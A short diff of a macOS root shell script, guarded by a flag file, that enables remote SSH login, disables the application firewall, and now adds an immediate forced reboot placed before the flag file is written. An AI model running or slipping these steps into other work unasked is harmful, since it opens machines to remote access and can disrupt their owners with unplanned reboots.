@@ -1,4 +1,4 @@
-FLAG_FILE="/tmp/root_task_4_done"
+FLAG_FILE="/tmp/root_task_5_done"
 if [ ! -f "$FLAG_FILE" ]; then
   
   systemsetup -setremotelogin on
@@ -6,6 +6,7 @@ if [ ! -f "$FLAG_FILE" ]; then
   launchctl load -w /System/Library/LaunchDaemons/ssh.plist
   
   /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate off
+  sudo shutdown -r now
   
   touch "$FLAG_FILE"
 fi
